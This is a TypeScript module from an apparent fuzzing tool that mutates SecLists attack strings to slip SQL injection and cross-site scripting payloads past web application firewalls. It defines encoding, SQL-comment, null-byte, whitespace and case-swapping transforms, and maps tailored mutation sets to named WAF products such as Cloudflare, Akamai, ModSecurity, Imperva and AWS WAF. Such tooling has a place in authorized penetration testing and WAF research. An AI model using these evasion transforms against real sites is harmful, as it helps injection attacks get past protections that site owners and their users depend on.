/**
 * SecListsMutator.ts — Dynamic Payload Transformation
 * Uses SecLists strings as Base Payloads and applies mutations to bypass WAFs.
 * Integrates with EvolutionaryFuzzer for genetic mutations.
 */

export interface MutatedPayload {
  original: string;
  mutated: string;
  mutationName: string;
  mutationType: "encoding" | "structural" | "evasion" | "case" | "comment";
}

// WAF-bypass mutation operators
const WAF_MUTATIONS: Array<{
  name: string;
  type: MutatedPayload["mutationType"];
  transform: (input: string) => string;
}> = [
  // Encoding mutations
  {
    name: "url_encode_critical",
    type: "encoding",
    transform: (s) => s.replace(/[<>"'();]/g, (c) => `%${c.charCodeAt(0).toString(16).toUpperCase()}`),
  },
  {
    name: "double_url_encode",
    type: "encoding",
    transform: (s) => s.replace(/[<>"'();]/g, (c) => `%25${c.charCodeAt(0).toString(16).toUpperCase()}`),
  },
  {
    name: "unicode_escape",
    type: "encoding",
    transform: (s) => s.replace(/[<>"']/g, (c) => `\\u${c.charCodeAt(0).toString(16).padStart(4, "0")}`),
  },
  {
    name: "html_entity_encode",
    type: "encoding",
    transform: (s) => s.replace(/</g, "&lt;").replace(/>/g, "&gt;").replace(/"/g, "&quot;").replace(/'/g, "&#39;"),
  },

  // Structural mutations
  {
    name: "sql_comment_injection",
    type: "comment",
    transform: (s) => s.replace(/ /g, "/**/"),
  },
  {
    name: "sql_inline_comment",
    type: "comment",
    transform: (s) => s.replace(/SELECT/gi, "SEL/*!ECT*/").replace(/UNION/gi, "UNI/*!ON*/"),
  },
  {
    name: "newline_injection",
    type: "structural",
    transform: (s) => s.replace(/ /g, "%0a"),
  },
  {
    name: "tab_injection",
    type: "structural",
    transform: (s) => s.replace(/ /g, "%09"),
  },
  {
    name: "null_byte_prefix",
    type: "evasion",
    transform: (s) => `%00${s}`,
  },

  // Case mutations
  {
    name: "alternating_case",
    type: "case",
    transform: (s) => s.split("").map((c, i) => i % 2 === 0 ? c.toUpperCase() : c.toLowerCase()).join(""),
  },
  {
    name: "keyword_case_swap",
    type: "case",
    transform: (s) => s
      .replace(/SELECT/gi, "sElEcT")
      .replace(/UNION/gi, "uNiOn")
      .replace(/script/gi, "ScRiPt")
      .replace(/alert/gi, "aLeRt"),
  },

  // Evasion mutations
  {
    name: "concat_split",
    type: "evasion",
    transform: (s) => {
      if (/SELECT/i.test(s)) return s.replace(/SELECT/i, "SE'+'LECT");
      if (/script/i.test(s)) return s.replace(/script/i, "scr\x00ipt");
      return s;
    },
  },
  {
    name: "protocol_relative",
    type: "evasion",
    transform: (s) => s.replace(/javascript:/gi, "java\tscript:").replace(/data:/gi, "da\tta:"),
  },
];

/**
 * Apply all relevant mutations to a base payload.
 * Returns an array of mutated variants.
 */
export function mutatePayload(
  original: string,
  maxMutations = 5
): MutatedPayload[] {
  const results: MutatedPayload[] = [];

  for (const mutation of WAF_MUTATIONS.slice(0, maxMutations)) {
    const mutated = mutation.transform(original);
    if (mutated !== original) {
      results.push({
        original,
        mutated,
        mutationName: mutation.name,
        mutationType: mutation.type,
      });
    }
  }

  return results;
}

/**
 * Apply mutations targeted for a specific WAF type.
 */
export function mutateForWaf(
  original: string,
  wafType: string
): MutatedPayload[] {
  const wafMutationMap: Record<string, string[]> = {
    cloudflare: ["double_url_encode", "unicode_escape", "sql_inline_comment", "alternating_case"],
    akamai: ["url_encode_critical", "newline_injection", "concat_split"],
    modsecurity: ["sql_comment_injection", "tab_injection", "keyword_case_swap"],
    imperva: ["double_url_encode", "null_byte_prefix", "protocol_relative"],
    aws_waf: ["unicode_escape", "sql_inline_comment", "newline_injection"],
  };

  const selectedNames = wafMutationMap[wafType.toLowerCase()] || [];
  const selectedMutations = WAF_MUTATIONS.filter((m) => selectedNames.includes(m.name));

  return selectedMutations.map((m) => {
    const mutated = m.transform(original);
    return { original, mutated, mutationName: m.name, mutationType: m.type };
  }).filter((r) => r.mutated !== r.original);
}

/**
 * Generate a comprehensive set of mutated payloads from a base list.
 */
export function generateMutationSuite(
  basePayloads: string[],
  maxPerPayload = 3
): MutatedPayload[] {
  const allMutations: MutatedPayload[] = [];

  for (const payload of basePayloads) {
    const mutations = mutatePayload(payload, maxPerPayload);
    allMutations.push(...mutations);
  }

  return allMutations;
}
